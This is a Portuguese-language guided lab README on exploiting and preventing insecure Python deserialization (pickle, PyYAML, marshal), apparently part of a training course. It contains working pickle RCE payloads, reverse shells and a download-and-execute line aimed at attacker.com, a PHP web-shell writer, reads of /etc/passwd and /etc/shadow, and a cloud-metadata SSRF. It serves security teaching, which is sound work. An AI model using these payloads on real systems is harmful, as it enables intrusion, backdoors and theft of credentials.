# 🔓 Insecure Deserialization - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟡 Intermediário → 🔴 Avançado
**Tempo estimado**: 5-7 horas
**Pontos**: 70 (15 + 25 + 30)

### O Que Você Vai Aprender

✅ Fundamentos de serialização e desserialização
✅ Python Pickle exploitation (RCE)
✅ JSON deserialization attacks
✅ YAML deserialization vulnerabilities
✅ Gadget chains
✅ Magic methods exploitation (__reduce__, __wakeup__)
✅ Detection e prevention

---

## 📖 Teoria Completa

### O Que É Deserialization?

**Serialização:** Converter objetos em formato que pode ser armazenado ou transmitido (bytes, string).

**Desserialização:** Converter bytes/string de volta para objeto.

### Por Que É Perigoso?

Quando aplicação desserializa dados não confiáveis, atacante pode:
- Executar código arbitrário (RCE)
- Modificar estruturas de dados
- Bypassar autenticação
- Causar DoS

---

## 🐍 Python Pickle - Exploitation

### O Que É Pickle?

Módulo Python para serialização de objetos.

```python
import pickle

# Serialização
data = {'username': 'alice', 'role': 'user'}
serialized = pickle.dumps(data)
# b'\x80\x04\x95...'

# Desserialização
restored = pickle.loads(serialized)
# {'username': 'alice', 'role': 'user'}
```

### Por Que Pickle É Perigoso?

**⚠️ Documentação oficial:**
> "The pickle module is not secure. Only unpickle data you trust."

Pickle pode executar código arbitrário durante desserialização!

### RCE Básico com Pickle

```python
import pickle
import os

# Payload malicioso
class RCE:
    def __reduce__(self):
        # Executado durante unpickle
        return (os.system, ('whoami',))

# Serializa
payload = pickle.dumps(RCE())

# Quando vítima desserializa:
pickle.loads(payload)  # ❌ Executa 'whoami'!
```

### Magic Method: __reduce__

`__reduce__()` define como objeto deve ser serializado/desserializado.

**Retorna:** `(callable, (args,))`

Durante unpickle, Python executa: `callable(*args)`

**Exemplos perigosos:**

```python
# 1. Executar comando
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('cat /etc/passwd',))

# 2. Reverse shell
class ReverseShell:
    def __reduce__(self):
        import os
        cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        return (os.system, (cmd,))

# 3. Executar Python code
class PythonExec:
    def __reduce__(self):
        import os
        return (exec, ("import socket; ...",))

# 4. Ler arquivo
class ReadFile:
    def __reduce__(self):
        return (open('/etc/passwd').read, ())
```

---

## 💣 Payloads de Pickle RCE

### 1. Comando Simples

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
```

**Serializado (base64):**
```
gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
```

### 2. Multi-command

```python
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami; hostname; pwd',))
```

### 3. File Write (backdoor)

```python
class WriteShell:
    def __reduce__(self):
        import os
        code = '<?php system($_GET["c"]); ?>'
        return (os.system, (f'echo "{code}" > /var/www/html/shell.php',))
```

### 4. Python Reverse Shell

```python
class ReverseShell:
    def __reduce__(self):
        import os
        cmd = '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
'''
        return (os.system, (cmd,))
```

### 5. Download & Execute

```python
class DownloadExec:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://attacker.com/malware.sh | bash',))
```

---

## 🔍 Identificando Vulnerabilidades

### 1. Cookies Serializados

```python
# VULNERÁVEL ❌
@app.route('/profile')
def profile():
    session_cookie = request.cookies.get('session')
    user_data = pickle.loads(base64.b64decode(session_cookie))
    return f"Welcome {user_data['username']}"
```

**Exploit:**
```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('nc attacker.com 4444 -e /bin/bash',))

malicious = base64.b64encode(pickle.dumps(Exploit()))
# Use como cookie
```

### 2. APIs com Pickle

```python
# VULNERÁVEL ❌
@app.route('/api/process', methods=['POST'])
def process():
    data = request.data
    obj = pickle.loads(data)  # Desserializa input do usuário!
    return jsonify({'result': process_data(obj)})
```

### 3. Cache/Session Storage

```python
# VULNERÁVEL ❌
def get_cached_data(key):
    cached = redis.get(key)
    if cached:
        return pickle.loads(cached)  # Se atacante controla cache...
```

### 4. File Uploads

```python
# VULNERÁVEL ❌
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    data = pickle.load(file)  # Desserializa arquivo enviado!
    save_to_db(data)
```

---

## 🧪 Outras Bibliotecas Vulneráveis

### 1. YAML (PyYAML)

```python
import yaml

# VULNERÁVEL ❌
config = yaml.load(user_input)  # Unsafe!

# Payload malicioso
payload = """
!!python/object/apply:os.system
args: ['whoami']
"""

yaml.load(payload)  # RCE!
```

**Correção:**
```python
# CORRETO ✅
config = yaml.safe_load(user_input)  # Apenas tipos básicos
```

### 2. JSON (com custom deserializer)

```python
import json

# VULNERÁVEL ❌
class CustomDecoder(json.JSONDecoder):
    def decode(self, s):
        obj = super().decode(s)
        if '__class__' in obj:
            # Instancia classe baseado em input!
            cls = eval(obj['__class__'])  # ❌ eval!
            return cls(**obj['data'])
        return obj

data = json.loads(user_input, cls=CustomDecoder)
```

### 3. Marshal (Python internal)

```python
import marshal

# VULNERÁVEL ❌
code = marshal.loads(untrusted_data)
exec(code)  # RCE direto!
```

---

## 🎯 Exploitation Techniques

### 1. Cookie Manipulation

```python
# Aplicação seta cookie pickle
@app.route('/login', methods=['POST'])
def login():
    user_data = {'username': username, 'role': 'user'}
    session_pickle = base64.b64encode(pickle.dumps(user_data))
    response.set_cookie('session', session_pickle)
```

**Exploit:**
```python
import pickle
import base64

# 1. Modifica role
user_data = {'username': 'attacker', 'role': 'admin'}
fake_cookie = base64.b64encode(pickle.dumps(user_data))

# 2. RCE
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('cat /etc/passwd',))

rce_cookie = base64.b64encode(pickle.dumps(RCE()))
```

### 2. API Exploitation

```bash
# Criar payload
python3 exploit.py > payload.pickle

# Enviar
curl -X POST http://target.com/api/process \
  --data-binary @payload.pickle \
  -H "Content-Type: application/octet-stream"
```

### 3. Chaining com outras vulnerabilidades

**Pickle + SSRF:**
```python
class SSRFPickle:
    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, ('http://169.254.169.254/latest/meta-data/',))
```

**Pickle + File Read:**
```python
class ReadSensitive:
    def __reduce__(self):
        return (__builtins__['open'], ('/etc/shadow', 'r'))
```

---

## 🛠️ Ferramentas

### 1. Gerando Payloads

```python
#!/usr/bin/env python3
import pickle
import base64
import sys

class PickleRCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        import os
        return (os.system, (self.command,))

if __name__ == '__main__':
    command = sys.argv[1] if len(sys.argv) > 1 else 'whoami'
    payload = pickle.dumps(PickleRCE(command))

    print("[*] Comando:", command)
    print("[*] Pickle (raw):", payload)
    print("[*] Pickle (base64):", base64.b64encode(payload).decode())
```

### 2. Pickle Scanner

```python
import pickle
import pickletools

# Analisa pickle
data = b'\x80\x04\x95...'
pickletools.dis(data)

# Output mostra operações:
#   0: \x80 PROTO      4
#   2: \x95 FRAME      ...
#   11: c    GLOBAL     'os system'
#   etc.
```

### 3. ysoserial (Java, mas conceito similar)

Para Python, use: [pickle-inject](https://github.com/splitline/Pickle-RCE)

---

## 🛡️ Prevenção

### 1. Nunca Desserialize Untrusted Data

```python
# CORRETO ✅ - Use JSON para dados externos
import json

# Seguro (apenas tipos básicos)
data = json.loads(user_input)
```

### 2. Use Signing para Validar Integridade

```python
# CORRETO ✅
import hmac
import hashlib
import pickle

SECRET_KEY = 'your-secret-key'

def safe_dumps(obj):
    pickled = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY.encode(), pickled, hashlib.sha256).digest()
    return signature + pickled

def safe_loads(data):
    signature = data[:32]
    pickled = data[32:]

    expected_sig = hmac.new(SECRET_KEY.encode(), pickled, hashlib.sha256).digest()

    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError("Invalid signature")

    return pickle.loads(pickled)
```

### 3. Use Bibliotecas Seguras

```python
# Para cookies/sessions
from flask import Flask, session
app = Flask(__name__)
app.secret_key = 'secret'

# Flask usa itsdangerous (JSON + signature, não pickle!)
session['user'] = 'alice'  # ✅ Seguro
```

### 4. Whitelist de Classes

```python
# CORRETO ✅
import pickle

SAFE_CLASSES = {
    'builtins': {'dict', 'list', 'str', 'int', 'float', 'bool'},
    '__main__': {'SafeClass1', 'SafeClass2'}
}

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in SAFE_CLASSES and name in SAFE_CLASSES[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Class {module}.{name} not allowed")

def safe_loads(data):
    return SafeUnpickler(io.BytesIO(data)).load()
```

### 5. Sandboxing

```python
# Executar desserialização em ambiente isolado
import subprocess

result = subprocess.run(
    ['python', '-c', 'import pickle; pickle.loads(...)'],
    capture_output=True,
    timeout=5,
    user='nobody',  # Usuário sem privilégios
    cwd='/tmp/sandbox'
)
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (15 pontos)
- **Porta**: 5080
- **Cenário**: Blog com comentários serializados
- Pickle em cookies
- Pickle em session storage
- RCE básico

### 2. 🟡 Intermediate App (25 pontos)
- **Porta**: 5081
- **Cenário**: API REST com cache
- Pickle em API endpoints
- YAML deserialization
- Bypass de whitelist básico

### 3. 🔴 Advanced App (30 pontos)
- **Porta**: 5082
- **Cenário**: Framework customizado
- Gadget chains
- Pickle com signature (weak)
- Custom deserializer exploitation

---

## 📝 Checklist de Conclusão

- [ ] Entendi conceito de serialização/desserialização
- [ ] Explorei Pickle RCE básico
- [ ] Criei payload __reduce__ customizado
- [ ] Obtive reverse shell via pickle
- [ ] Explorei YAML deserialization
- [ ] Bypassei whitelist de classes
- [ ] Quebrei signature fraca
- [ ] Explorei gadget chain
- [ ] Implementei safe unpickler
- [ ] Completei todos os exercícios

**Total**: 70 pontos

---

## 🎓 Próximos Passos

Após dominar Insecure Deserialization:

1. **Java Deserialization (ysoserial)**
2. **.NET Deserialization**
3. **PHP unserialize()**
4. **Ruby Marshal**

**Próximo Lab**: [09 - SSTI →](../09-ssti/README.md)

---

**Boa sorte e happy hacking! 🔓**
